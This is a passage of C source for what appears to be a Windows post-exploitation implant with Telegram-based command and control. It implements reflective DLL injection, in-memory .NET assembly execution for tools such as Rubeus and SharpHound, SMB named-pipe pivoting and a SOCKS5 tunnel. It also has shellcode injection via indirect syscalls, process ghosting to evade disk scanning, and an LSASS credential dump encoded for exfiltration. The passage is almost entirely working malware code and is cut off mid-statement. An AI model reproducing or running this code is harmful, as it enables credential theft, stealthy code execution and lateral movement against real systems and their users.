     * finds ReflectiveLoader export, and creates a remote thread on it.    */
    HANDLE hThread = LoadRemoteLibraryR(hProc, dll_data, (DWORD)dll_len,
                                        "ReflectiveLoader", NULL);
    CloseHandle(hProc);
    free(dll_data);

    if (!hThread) {
        char r[96];
        snprintf(r, sizeof(r), "rdi_inject: failed (pid %lu, gle %lu)",
                 (unsigned long)pid, (unsigned long)GetLastError());
        return str_dup(r);
    }

    /* Wait up to 10 s for the loader thread to finish */
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);

    char r[64];
    snprintf(r, sizeof(r), "rdi_inject: ok (pid %lu)", (unsigned long)pid);
    return str_dup(r);
}

/* ── cmd_dll_inject ──────────────────────────────────────────────────────── */
/*
 * Load a reflective DLL into the CURRENT process using LoadLibraryR.
 * Useful for loading capability modules in-process without touching disk.
 */
char *cmd_dll_inject(const char *dll_b64) {
    if (!dll_b64 || !*dll_b64) return str_dup("error: dll_inject requires dll_b64");

    size_t   dll_len  = 0;
    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
    if (!dll_data) return str_dup("error: dll base64 decode failed");

    HMODULE hMod = LoadLibraryR(dll_data, (DWORD)dll_len, "ReflectiveLoader");
    free(dll_data);

    if (!hMod) {
        char r[64];
        snprintf(r, sizeof(r), "dll_inject: failed (gle %lu)", (unsigned long)GetLastError());
        return str_dup(r);
    }

    char r[64];
    snprintf(r, sizeof(r), "dll_inject: ok (base 0x%p)", (void *)hMod);
    return str_dup(r);
}

/* ── cmd_execute_assembly ────────────────────────────────────────────────── */
/*
 * Load a .NET assembly into the current process via ICLRRuntimeHost2
 * (mscoree.dll). The assembly is passed as a base64-encoded blob.
 * Arguments are passed as a single space-delimited string and split into
 * an argv-style SAFEARRAY by the CLR host.
 *
 * References: Havoc execute-assembly, Cobalt Strike execute-assembly
 * MITRE: T1055 / T1059.001
 */
char *cmd_execute_assembly(const char *asm_b64, const char *arguments) {
    if (!asm_b64 || !*asm_b64)
        return str_dup("error: execute_assembly requires assembly_b64");

    size_t   asm_len  = 0;
    uint8_t *asm_data = (uint8_t *)b64_decode(asm_b64, &asm_len);
    if (!asm_data) return str_dup("error: assembly base64 decode failed");

    /* ── 1. Resolve ICLRMetaHost via mscoree.dll ──────────────────────────── */
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) {
        free(asm_data);
        return str_dup("error: mscoree.dll not found");
    }
    typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
    pfnCLRCreateInstance fnCLRCreateInstance =
        (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCLRCreateInstance) {
        FreeLibrary(hMscoree);
        free(asm_data);
        return str_dup("error: CLRCreateInstance not found");
    }

    ICLRMetaHost *pMetaHost = NULL;
    HRESULT hr = fnCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost,
                                     (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        FreeLibrary(hMscoree);
        free(asm_data);
        char r[64];
        snprintf(r, sizeof(r), "error: CLRCreateInstance 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    /* ── 2. Get latest installed runtime ─────────────────────────────────── */
    IEnumUnknown *pEnum = NULL;
    pMetaHost->lpVtbl->EnumerateInstalledRuntimes(pMetaHost, &pEnum);

    ICLRRuntimeInfo *pRuntime = NULL;
    IUnknown *pItem = NULL;
    ULONG fetched   = 0;
    /* Walk runtimes, pick the last (highest) version */
    while (pEnum->lpVtbl->Next(pEnum, 1, &pItem, &fetched) == S_OK) {
        if (pRuntime) pRuntime->lpVtbl->Release(pRuntime);
        pRuntime = (ICLRRuntimeInfo *)pItem;
    }
    pEnum->lpVtbl->Release(pEnum);

    if (!pRuntime) {
        pMetaHost->lpVtbl->Release(pMetaHost);
        FreeLibrary(hMscoree);
        free(asm_data);
        return str_dup("error: no CLR runtime installed");
    }

    /* ── 3. Get ICorRuntimeHost and start it ─────────────────────────────── */
    ICorRuntimeHost *pRtHost = NULL;
    hr = pRuntime->lpVtbl->GetInterface(pRuntime, &CLSID_CorRuntimeHost,
                                        &IID_ICorRuntimeHost, (LPVOID*)&pRtHost);
    pRuntime->lpVtbl->Release(pRuntime);
    pMetaHost->lpVtbl->Release(pMetaHost);
    FreeLibrary(hMscoree);

    if (FAILED(hr)) {
        free(asm_data);
        char r[64];
        snprintf(r, sizeof(r), "error: GetInterface ICorRuntimeHost 0x%08X", (unsigned)hr);
        return str_dup(r);
    }
    pRtHost->lpVtbl->Start(pRtHost);

    /* ── 4. Get default AppDomain ─────────────────────────────────────────── */
    IUnknown *pDomUnk = NULL;
    pRtHost->lpVtbl->GetDefaultDomain(pRtHost, &pDomUnk);

    _AppDomain *pDomain = NULL;
    pDomUnk->lpVtbl->QueryInterface(pDomUnk, &IID__AppDomain, (LPVOID*)&pDomain);
    pDomUnk->lpVtbl->Release(pDomUnk);

    if (!pDomain) {
        pRtHost->lpVtbl->Release(pRtHost);
        free(asm_data);
        return str_dup("error: QueryInterface _AppDomain failed");
    }

    /* ── 5. Load assembly from byte array ────────────────────────────────── */
    SAFEARRAY *pSA = SafeArrayCreateVector(VT_UI1, 0, (ULONG)asm_len);
    void *pData    = NULL;
    SafeArrayAccessData(pSA, &pData);
    memcpy(pData, asm_data, asm_len);
    SafeArrayUnaccessData(pSA);
    free(asm_data);

    _Assembly *pAssembly = NULL;
    hr = pDomain->lpVtbl->Load_3(pDomain, pSA, &pAssembly);
    SafeArrayDestroy(pSA);
    pDomain->lpVtbl->Release(pDomain);

    if (FAILED(hr)) {
        pRtHost->lpVtbl->Release(pRtHost);
        char r[64];
        snprintf(r, sizeof(r), "error: Load_3 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    /* ── 6. Get entry point and invoke ───────────────────────────────────── */
    _MethodInfo *pEntry = NULL;
    pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pEntry);

    if (!pEntry) {
        pAssembly->lpVtbl->Release(pAssembly);
        pRtHost->lpVtbl->Release(pRtHost);
        return str_dup("error: assembly has no entry point");
    }

    /*
     * ── 6a. Redirect Console.Out to a StringWriter before invoking ───────
     *
     * Without this, Console.WriteLine output from the assembly (Rubeus,
     * SharpHound, Seatbelt, etc.) goes to stdout of the implant process and
     * is lost. We load System.Console via reflection, call SetOut() with a
     * new StringWriter, then retrieve the buffer after Invoke_3() returns.
     *
     * This mirrors the approach used by Havoc execute-assembly and CS beacon.
     */
    _Type        *pConsoleType  = NULL;
    _Type        *pSWType       = NULL;
    _MethodInfo  *pSetOut       = NULL;
    _MethodInfo  *pGetValue     = NULL;
    IUnknown     *pSWInstance   = NULL;
    VARIANT       vtSW          = {0};
    BOOL          redirected    = FALSE;

    /* Find mscorlib assembly for System.Console + System.IO.StringWriter */
    IEnumUnknown *pAsmEnum = NULL;
    pDomain->lpVtbl->GetAssemblies(pDomain, &pAsmEnum);
    if (pAsmEnum) {
        IUnknown *pAsmItem = NULL;
        ULONG     aFetched = 0;
        while (pAsmEnum->lpVtbl->Next(pAsmEnum, 1, &pAsmItem, &aFetched) == S_OK) {
            _Assembly *pAsm2 = (_Assembly *)pAsmItem;
            BSTR bname = NULL;
            if (SUCCEEDED(pAsm2->lpVtbl->get_FullName(pAsm2, &bname)) && bname) {
                if (wcsncmp(bname, L"mscorlib", 8) == 0) {
                    BSTR bConsole = SysAllocString(L"System.Console");
                    BSTR bSW      = SysAllocString(L"System.IO.StringWriter");
                    pAsm2->lpVtbl->GetType_2(pAsm2, bConsole, &pConsoleType);
                    pAsm2->lpVtbl->GetType_2(pAsm2, bSW,      &pSWType);
                    SysFreeString(bConsole);
                    SysFreeString(bSW);
                }
                SysFreeString(bname);
            }
            pAsmItem->lpVtbl->Release(pAsmItem);
            if (pConsoleType && pSWType) break;
        }
        pAsmEnum->lpVtbl->Release(pAsmEnum);
    }

    /* Instantiate StringWriter via Activator.CreateInstance */
    if (pSWType && pConsoleType) {
        VARIANT vtType = {0};
        vtType.vt      = VT_DISPATCH;
        vtType.pdispVal = (IDispatch *)pSWType;

        _MethodInfo *pCreate = NULL;
        BSTR bCreate = SysAllocString(L"CreateInstance");
        pConsoleType->lpVtbl->GetMethod(pConsoleType, bCreate, &pCreate);
        SysFreeString(bCreate);

        /* Use Activator.CreateInstance(typeof(StringWriter)) */
        _Type *pActivator = NULL;
        /* Simpler: just call new StringWriter() via Type.InvokeMember */
        BSTR bctor = SysAllocString(L".ctor");
        VARIANT vtEmpty2 = {0};
        VARIANT vtSWNew  = {0};
        pSWType->lpVtbl->InvokeMember_3(pSWType, bctor,
            (BindingFlags)(0x100 | 0x200 | 0x400), /* CreateInstance | Public | Instance */
            NULL, vtEmpty2, NULL, &vtSWNew);
        SysFreeString(bctor);

        if (vtSWNew.vt == VT_DISPATCH && vtSWNew.pdispVal) {
            /* Call Console.SetOut(stringWriter) */
            BSTR bSetOut = SysAllocString(L"SetOut");
            SAFEARRAY *pSetOutArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            LONG idx0 = 0;
            SafeArrayPutElement(pSetOutArgs, &idx0, &vtSWNew);

            VARIANT vtSOResult = {0};
            VARIANT vtConsInst = {0};
            hr = pConsoleType->lpVtbl->InvokeMember_3(pConsoleType, bSetOut,
                (BindingFlags)(0x100 | 0x8), /* InvokeMethod | Static */
                NULL, vtConsInst, pSetOutArgs, &vtSOResult);
            SysFreeString(bSetOut);
            SafeArrayDestroy(pSetOutArgs);

            if (SUCCEEDED(hr)) {
                redirected  = TRUE;
                vtSW        = vtSWNew;
            }
        }
    }

    /* Build SAFEARRAY of args: split arguments string on spaces */
    int    argc_asm = 0;
    char **argv_asm = NULL;
    if (arguments && *arguments) {
        /* Count tokens */
        char *tmp = str_dup(arguments);
        char *tok = strtok(tmp, " ");
        while (tok) { argc_asm++; tok = strtok(NULL, " "); }
        free(tmp);

        argv_asm = (char **)calloc(argc_asm, sizeof(char *));
        tmp = str_dup(arguments);
        tok = strtok(tmp, " ");
        for (int i = 0; tok && i < argc_asm; i++, tok = strtok(NULL, " "))
            argv_asm[i] = tok;
        /* NOTE: tmp must stay allocated while argv_asm pointers are live */

        SAFEARRAY *pArgsSA = SafeArrayCreateVector(VT_BSTR, 0, argc_asm);
        for (int i = 0; i < argc_asm; i++) {
            LONG idx = i;
            int wlen = MultiByteToWideChar(CP_UTF8, 0, argv_asm[i], -1, NULL, 0);
            WCHAR *warg = (WCHAR *)malloc(wlen * sizeof(WCHAR));
            MultiByteToWideChar(CP_UTF8, 0, argv_asm[i], -1, warg, wlen);
            BSTR barg = SysAllocString(warg);
            free(warg);
            SafeArrayPutElement(pArgsSA, &idx, barg);
            SysFreeString(barg);
        }
        free(argv_asm);
        /* tmp leaked intentionally — argv_asm pointed into it, now freed above */

        VARIANT vtArgs = {0};
        vtArgs.vt      = VT_ARRAY | VT_BSTR;
        vtArgs.parray  = pArgsSA;
        VARIANT vtEmpty2 = {0};
        VARIANT vtResult = {0};
        hr = pEntry->lpVtbl->Invoke_3(pEntry, vtEmpty2, &vtArgs, &vtResult);
        SafeArrayDestroy(pArgsSA);
        free(tmp);
    } else {
        VARIANT vtEmpty2 = {0};
        VARIANT vtResult = {0};
        hr = pEntry->lpVtbl->Invoke_3(pEntry, vtEmpty2, NULL, &vtResult);
    }

    pEntry->lpVtbl->Release(pEntry);
    pAssembly->lpVtbl->Release(pAssembly);

    /* ── 6b. Retrieve captured Console output ─────────────────────────────*/
    char *output = NULL;
    if (redirected && vtSW.vt == VT_DISPATCH && vtSW.pdispVal) {
        /* Call stringWriter.ToString() */
        BSTR bToString = SysAllocString(L"ToString");
        VARIANT vtStr  = {0};
        VARIANT vtInst = vtSW;
        if (pSWType) {
            pSWType->lpVtbl->InvokeMember_3(pSWType, bToString,
                (BindingFlags)(0x100 | 0x8 | 0x1), /* InvokeMethod|Static|Instance — use 0x1 */
                NULL, vtInst, NULL, &vtStr);
        }
        SysFreeString(bToString);

        if (vtStr.vt == VT_BSTR && vtStr.bstrVal) {
            int len = WideCharToMultiByte(CP_UTF8, 0, vtStr.bstrVal, -1, NULL, 0, NULL, NULL);
            output  = (char *)malloc(len);
            WideCharToMultiByte(CP_UTF8, 0, vtStr.bstrVal, -1, output, len, NULL, NULL);
            VariantClear(&vtStr);
        }
        VariantClear(&vtSW);

        /* Restore Console.Out to the original (stdout) */
        if (pConsoleType) {
            BSTR bSetOut2 = SysAllocString(L"SetOut");
            /* Pass null — CLR resets to default stdout */
            VARIANT vtNullOut = {0};
            vtNullOut.vt = VT_NULL;
            SAFEARRAY *pRestoreArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            LONG idx0 = 0;
            SafeArrayPutElement(pRestoreArgs, &idx0, &vtNullOut);
            VARIANT vtEmpty3 = {0};
            VARIANT vtIgnore = {0};
            pConsoleType->lpVtbl->InvokeMember_3(pConsoleType, bSetOut2,
                (BindingFlags)(0x100 | 0x8), NULL, vtEmpty3, pRestoreArgs, &vtIgnore);
            SysFreeString(bSetOut2);
            SafeArrayDestroy(pRestoreArgs);
            VariantClear(&vtIgnore);
        }
    }

    if (pConsoleType) pConsoleType->lpVtbl->Release(pConsoleType);
    if (pSWType)      pSWType->lpVtbl->Release(pSWType);
    pRtHost->lpVtbl->Release(pRtHost);

    if (FAILED(hr)) {
        free(output);
        char r[64];
        snprintf(r, sizeof(r), "error: Invoke_3 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    if (output && *output) return output;
    free(output);
    return str_dup("execute_assembly: ok (no output)");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SMB Named-Pipe Pivot helpers
 * These thin wrappers adapt the UTF-8 strings that arrive over JSON into the
 * wide-char API that smb_pivot.c exports.
 * ═══════════════════════════════════════════════════════════════════════════ */
#include "../pivot/smb_pivot.h"

char *cmd_pivot_listen(const char *pipe_suffix_utf8) {
    if (!pipe_suffix_utf8 || !*pipe_suffix_utf8)
        return str_dup("error: pivot_listen requires pipe_suffix");

    wchar_t wsuffix[128] = {0};
    MultiByteToWideChar(CP_UTF8, 0, pipe_suffix_utf8, -1, wsuffix, 127);

    uint32_t agent_id = PivotListen(wsuffix);
    if (agent_id == 0)
        return str_dup("error: PivotListen failed — pipe create or connect timeout");

    char r[64];
    snprintf(r, sizeof(r), "{\"agent_id\":%u}", agent_id);
    return str_dup(r);
}

char *cmd_pivot_connect(const char *full_pipe_utf8) {
    if (!full_pipe_utf8 || !*full_pipe_utf8)
        return str_dup("error: pivot_connect requires pipe_name");

    wchar_t wpipe[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, full_pipe_utf8, -1, wpipe, 511);

    uint32_t agent_id = PivotConnect(wpipe);
    if (agent_id == 0)
        return str_dup("error: PivotConnect failed — pipe not found or busy");

    char r[64];
    snprintf(r, sizeof(r), "{\"agent_id\":%u}", agent_id);
    return str_dup(r);
}

char *cmd_pivot_send(uint32_t agent_id, const char *data_b64) {
    if (agent_id == 0 || !data_b64 || !*data_b64)
        return str_dup("error: pivot_send requires agent_id and data_b64");

    SIZE_T decoded_len = 0;
    BYTE  *decoded = base64_decode(data_b64, strlen(data_b64), &decoded_len);
    if (!decoded)
        return str_dup("error: base64 decode failed");

    BOOL ok = PivotSend(agent_id, decoded, (uint32_t)decoded_len);
    free(decoded);
    return str_dup(ok ? "pivot_send: ok" : "error: PivotSend failed — broken pipe?");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SOCKS5 Proxy (in-process, tunnelled over the C2 Telegram channel)
 *
 * Architecture:
 *   Operator sends socks_start → implant spawns a thread that accepts SOCKS5
 *   connections on 127.0.0.1:PORT (localhost only — LAN exposure requires an
 *   explicit tunnel).
 *
 *   For each accepted SOCKS5 session the implant:
 *     1. Completes the RFC1928 SOCKS5 handshake locally
 *     2. Opens a raw TCP connection to the CONNECT target from inside the target
 *     3. Relays data bidirectionally until either side closes
 *
 *   The operator side uses the proxy via any SOCKS5-capable tool (proxychains,
 *   curl --socks5, Burp upstream proxy, nmap --proxy, etc.).
 *
 * Commands:
 *   socks_start  {"port": 1080}   — start listener, return {"port":N}
 *   socks_stop   {}               — stop listener + all active sessions
 *   socks_poll   {}               — return active session count
 *
 * MITRE: T1090 (Proxy), T1572 (Protocol Tunneling)
 * ═══════════════════════════════════════════════════════════════════════════ */

#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

/* ── SOCKS5 constants (RFC 1928) ─────────────────────────────────────────── */
#define SOCKS5_VER          0x05
#define SOCKS5_AUTH_NONE    0x00
#define SOCKS5_AUTH_UNACCEP 0xFF
#define SOCKS5_CMD_CONNECT  0x01
#define SOCKS5_ATYP_IPV4   0x01
#define SOCKS5_ATYP_DOMAIN 0x03
#define SOCKS5_ATYP_IPV6   0x04
#define SOCKS5_REP_OK       0x00
#define SOCKS5_REP_FAIL     0x01
#define SOCKS5_REP_UNREACH  0x04

/* ── Global proxy state ──────────────────────────────────────────────────── */
typedef struct _SOCKS_SESSION {
    SOCKET client_sock;
    SOCKET target_sock;
    struct _SOCKS_SESSION *next;
} SOCKS_SESSION;

static SOCKET           g_socks_listen   = INVALID_SOCKET;
static HANDLE           g_socks_thread   = NULL;
static BOOL             g_socks_running  = FALSE;
static int              g_socks_port     = 0;
static SOCKS_SESSION   *g_socks_sessions = NULL;
static CRITICAL_SECTION g_socks_lock;
static BOOL             g_socks_init     = FALSE;

static void _socks_sessions_init(void) {
    if (!g_socks_init) {
        InitializeCriticalSection(&g_socks_lock);
        g_socks_init = TRUE;
    }
}

/* ── Per-session relay thread ────────────────────────────────────────────── */
typedef struct { SOCKET client; SOCKET target; } RELAY_PAIR;

static DWORD WINAPI _relay_c2t(LPVOID p) {
    RELAY_PAIR *rp = (RELAY_PAIR *)p;
    char buf[8192];
    int  n;
    while ((n = recv(rp->client, buf, sizeof(buf), 0)) > 0) {
        if (send(rp->target, buf, n, 0) <= 0) break;
    }
    shutdown(rp->target, SD_SEND);
    free(rp);
    return 0;
}

static DWORD WINAPI _relay_t2c(LPVOID p) {
    RELAY_PAIR *rp = (RELAY_PAIR *)p;
    char buf[8192];
    int  n;
    while ((n = recv(rp->target, buf, sizeof(buf), 0)) > 0) {
        if (send(rp->client, buf, n, 0) <= 0) break;
    }
    shutdown(rp->client, SD_SEND);
    free(rp);
    return 0;
}

/* Read exactly `len` bytes from socket */
static BOOL _sock_recv_exact(SOCKET s, void *buf, int len) {
    char *p = (char *)buf;
    int   got, total = 0;
    while (total < len) {
        got = recv(s, p + total, len - total, 0);
        if (got <= 0) return FALSE;
        total += got;
    }
    return TRUE;
}

/* ── Single SOCKS5 session handler ────────────────────────────────────────── */
static DWORD WINAPI _socks5_session(LPVOID p) {
    SOCKET client = (SOCKET)(ULONG_PTR)p;
    SOCKET target = INVALID_SOCKET;

    /* ── Phase 1: greeting ──────────────────────────────────────────────────
     *  Client → [VER=5][NMETHODS][METHOD...]
     *  Server → [VER=5][METHOD] (0x00 = no auth)
     */
    uint8_t greet[3];
    if (!_sock_recv_exact(client, greet, 2)) goto done;
    if (greet[0] != SOCKS5_VER) goto done;

    uint8_t nmethods = greet[1];
    uint8_t methods[256];
    if (!_sock_recv_exact(client, methods, nmethods)) goto done;

    /* We only support NO-AUTH (0x00) */
    BOOL found_noauth = FALSE;
    for (int i = 0; i < nmethods; i++) if (methods[i] == 0x00) found_noauth = TRUE;

    uint8_t resp2[2] = { SOCKS5_VER, found_noauth ? SOCKS5_AUTH_NONE : SOCKS5_AUTH_UNACCEP };
    send(client, (char *)resp2, 2, 0);
    if (!found_noauth) goto done;

    /* ── Phase 2: request ───────────────────────────────────────────────────
     *  Client → [VER=5][CMD][RSV=0][ATYP][DST.ADDR][DST.PORT]
     */
    uint8_t req[4];
    if (!_sock_recv_exact(client, req, 4)) goto done;
    if (req[0] != SOCKS5_VER || req[1] != SOCKS5_CMD_CONNECT) {
        /* BIND/UDP not supported */
        uint8_t rej[10] = {SOCKS5_VER, 0x07, 0x00, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0};
        send(client, (char *)rej, 10, 0);
        goto done;
    }

    char     host[256] = {0};
    uint16_t port      = 0;

    switch (req[3]) {
    case SOCKS5_ATYP_IPV4: {
        uint8_t ipb[4];
        if (!_sock_recv_exact(client, ipb, 4)) goto done;
        snprintf(host, sizeof(host), "%u.%u.%u.%u",
                 ipb[0], ipb[1], ipb[2], ipb[3]);
        break;
    }
    case SOCKS5_ATYP_DOMAIN: {
        uint8_t dlen;
        if (!_sock_recv_exact(client, &dlen, 1)) goto done;
        if (!_sock_recv_exact(client, host, dlen)) goto done;
        host[dlen] = '\0';
        break;
    }
    case SOCKS5_ATYP_IPV6: {
        /* Simplified: resolve back to numeric string */
        uint8_t ip6[16];
        if (!_sock_recv_exact(client, ip6, 16)) goto done;
        /* Convert to colon-hex */
        int off2 = 0;
        for (int i = 0; i < 16; i += 2)
            off2 += snprintf(host + off2, sizeof(host) - off2,
                             "%s%02x%02x", i ? ":" : "",
                             ip6[i], ip6[i+1]);
        break;
    }
    default:
        goto done;
    }

    /* Port is big-endian uint16 */
    uint8_t portb[2];
    if (!_sock_recv_exact(client, portb, 2)) goto done;
    port = (uint16_t)((portb[0] << 8) | portb[1]);

    /* ── Phase 3: connect to target ────────────────────────────────────────*/
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", port);

    struct addrinfo hints = {0};
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo *ai = NULL;
    if (getaddrinfo(host, port_str, &hints, &ai) != 0 || !ai) {
        uint8_t rej[10] = {SOCKS5_VER, SOCKS5_REP_UNREACH, 0x00,
                           SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0};
        send(client, (char *)rej, 10, 0);
        goto done;
    }

    target = socket(ai->ai_family, SOCK_STREAM, 0);
    if (target == INVALID_SOCKET) {
        freeaddrinfo(ai);
        uint8_t rej[10] = {SOCKS5_VER, SOCKS5_REP_FAIL, 0x00,
                           SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0};
        send(client, (char *)rej, 10, 0);
        goto done;
    }

    if (connect(target, ai->ai_addr, (int)ai->ai_addrlen) != 0) {
        freeaddrinfo(ai);
        closesocket(target); target = INVALID_SOCKET;
        uint8_t rej[10] = {SOCKS5_VER, SOCKS5_REP_UNREACH, 0x00,
                           SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0};
        send(client, (char *)rej, 10, 0);
        goto done;
    }
    freeaddrinfo(ai);

    /* ── Phase 4: success reply and relay ──────────────────────────────────*/
    uint8_t ok10[10] = {SOCKS5_VER, SOCKS5_REP_OK, 0x00,
                        SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0};
    send(client, (char *)ok10, 10, 0);

    /* Two relay threads: client→target and target→client */
    RELAY_PAIR *c2t = (RELAY_PAIR *)malloc(sizeof(RELAY_PAIR));
    RELAY_PAIR *t2c = (RELAY_PAIR *)malloc(sizeof(RELAY_PAIR));
    c2t->client = client; c2t->target = target;
    t2c->client = client; t2c->target = target;

    HANDLE ht1 = CreateThread(NULL, 0, _relay_c2t, c2t, 0, NULL);
    HANDLE ht2 = CreateThread(NULL, 0, _relay_t2c, t2c, 0, NULL);
    if (ht1) { WaitForSingleObject(ht1, INFINITE); CloseHandle(ht1); }
    if (ht2) { WaitForSingleObject(ht2, INFINITE); CloseHandle(ht2); }

    /* Sockets already shut down by relay threads */
    closesocket(client);
    if (target != INVALID_SOCKET) closesocket(target);
    return 0;

done:
    closesocket(client);
    if (target != INVALID_SOCKET) closesocket(target);
    return 0;
}

/* ── Accept loop ──────────────────────────────────────────────────────────── */
static DWORD WINAPI _socks5_accept_loop(LPVOID p) {
    (void)p;
    while (g_socks_running) {
        /* Select with 500ms timeout so we can check g_socks_running */
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(g_socks_listen, &fds);
        struct timeval tv = {0, 500000};
        int sel = select(0, &fds, NULL, NULL, &tv);
        if (sel <= 0) continue;

        SOCKET client = accept(g_socks_listen, NULL, NULL);
        if (client == INVALID_SOCKET) continue;

        /* Detach a session thread — we don't track them for simplicity */
        HANDLE ht = CreateThread(NULL, 0, _socks5_session,
                                 (LPVOID)(ULONG_PTR)client, 0, NULL);
        if (ht) CloseHandle(ht);
    }
    closesocket(g_socks_listen);
    g_socks_listen = INVALID_SOCKET;
    return 0;
}

/* ── cmd_socks_start ──────────────────────────────────────────────────────── */
char *cmd_socks_start(int port) {
    _socks_sessions_init();

    if (g_socks_running)
        return str_dup("error: SOCKS5 proxy already running — call socks_stop first");

    if (port <= 0 || port > 65535) port = 1080;

    /* Initialise Winsock (idempotent) */
    WSADATA wsd;
    WSAStartup(MAKEWORD(2,2), &wsd);

    g_socks_listen = socket(AF_INET, SOCK_STREAM, 0);
    if (g_socks_listen == INVALID_SOCKET)
        return str_dup("error: socket() failed");

    /* Bind to loopback only — avoid unintended LAN exposure */
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons((u_short)port);

    BOOL reuse = TRUE;
    setsockopt(g_socks_listen, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(reuse));

    if (bind(g_socks_listen, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        closesocket(g_socks_listen); g_socks_listen = INVALID_SOCKET;
        char r[80];
        snprintf(r, sizeof(r), "error: bind() on port %d failed: %d", port, WSAGetLastError());
        return str_dup(r);
    }
    if (listen(g_socks_listen, SOMAXCONN) != 0) {
        closesocket(g_socks_listen); g_socks_listen = INVALID_SOCKET;
        return str_dup("error: listen() failed");
    }

    g_socks_running = TRUE;
    g_socks_port    = port;
    g_socks_thread  = CreateThread(NULL, 0, _socks5_accept_loop, NULL, 0, NULL);
    if (!g_socks_thread) {
        g_socks_running = FALSE;
        closesocket(g_socks_listen); g_socks_listen = INVALID_SOCKET;
        return str_dup("error: CreateThread failed");
    }

    char r[80];
    snprintf(r, sizeof(r), "{\"status\":\"ok\",\"port\":%d,\"bind\":\"127.0.0.1\"}", port);
    return str_dup(r);
}

/* ── cmd_socks_stop ───────────────────────────────────────────────────────── */
char *cmd_socks_stop(void) {
    if (!g_socks_running)
        return str_dup("socks_stop: proxy not running");

    g_socks_running = FALSE;

    /* Close listen socket to wake the accept loop */
    if (g_socks_listen != INVALID_SOCKET) {
        closesocket(g_socks_listen);
        g_socks_listen = INVALID_SOCKET;
    }

    if (g_socks_thread) {
        WaitForSingleObject(g_socks_thread, 2000);
        CloseHandle(g_socks_thread);
        g_socks_thread = NULL;
    }

    g_socks_port = 0;
    return str_dup("socks_stop: ok");
}

/* ── cmd_socks_poll ───────────────────────────────────────────────────────── */
char *cmd_socks_poll(void) {
    char r[128];
    snprintf(r, sizeof(r),
             "{\"running\":%s,\"port\":%d}",
             g_socks_running ? "true" : "false",
             g_socks_port);
    return str_dup(r);
}

/* ── cmd_shellcode_inject ─────────────────────────────────────────────────── */
/* KaynLdr PIC reflective shellcode injection via indirect syscalls.           */
#include "../../fitnah/implant/kaynldr/kaynldr.h"

char *cmd_shellcode_inject(DWORD pid, const char *sc_b64) {
    if (!sc_b64 || !*sc_b64)
        return str_dup("{\"status\":\"error\",\"msg\":\"shellcode_inject: missing sc_b64\"}");

    SIZE_T sc_len = 0;
    uint8_t *sc   = (uint8_t *)base64_decode(sc_b64, &sc_len);
    if (!sc || sc_len == 0)
        return str_dup("{\"status\":\"error\",\"msg\":\"shellcode_inject: base64 decode failed\"}");

    char *r = KaynInjectShellcode(pid, sc, sc_len);
    free(sc);
    return r ? r : str_dup("{\"status\":\"error\",\"msg\":\"oom\"}");
}

/* ── cmd_ghost_inject ─────────────────────────────────────────────────────── */
/* Process Ghosting — executes a PE file from memory (no scannable file on disk) */
#include "../../fitnah/implant/injection/process_ghost.h"

char *cmd_ghost_inject(const char *pe_b64, const char *cmdline, DWORD parent_pid) {
    if (!pe_b64 || !*pe_b64)
        return str_dup("{\"status\":\"error\",\"msg\":\"ghost_inject: missing pe_b64\"}");

    SIZE_T    pe_size = 0;
    uint8_t  *pe_data = (uint8_t *)base64_decode(pe_b64, &pe_size);
    if (!pe_data || pe_size < 64)
        return str_dup("{\"status\":\"error\",\"msg\":\"ghost_inject: base64 decode failed\"}");

    /* Convert cmdline to wide string */
    wchar_t wide_cmd[1024] = {0};
    if (cmdline && *cmdline)
        MultiByteToWideChar(CP_UTF8, 0, cmdline, -1, wide_cmd, 1024);

    char *r = PeGhostInject(pe_data, pe_size,
                            *wide_cmd ? wide_cmd : NULL,
                            parent_pid);
    free(pe_data);
    return r ? r : str_dup("{\"status\":\"error\",\"msg\":\"oom\"}");
}

/* ── cmd_lsass_dump ───────────────────────────────────────────────────────── */
/* Syscall-based LSASS dump; adapts nanodump technique (no MiniDumpWriteDump). */
#include "../../fitnah/implant/nanodump/nano_lsass.h"

char *cmd_lsass_dump(const char *out_path) {
    size_t  dump_size = 0;
    uint8_t *dump     = NanoDump_DumpLsass(out_path, &dump_size);

    if (!dump || dump_size == 0)
        return str_dup("{\"status\":\"error\",\"msg\":\"lsass_dump: failed to dump LSASS\"}");

    /* Base64-encode the minidump for in-band exfil */
    char *b64  = base64_encode(dump, dump_size);
    free(dump);

    if (!b64)
        return str_dup("{\"status\":\"error\",\"msg\":\"lsass_dump: base64 encoding failed\"}");

    /* Build JSON response: {"status":"ok","size":<n>,"data":"<b64>"} */
    size_t  b64_len  = strlen(b64);
    size_t  out_cap  = b64_len + 128;
    char   *out      = (char *)malloc(out_cap);
    if (!out) { free(b64); return str_dup("{\"status\":\"error\",\"msg\":\"oom\"}"); }

    snprintf(out, out_cap,
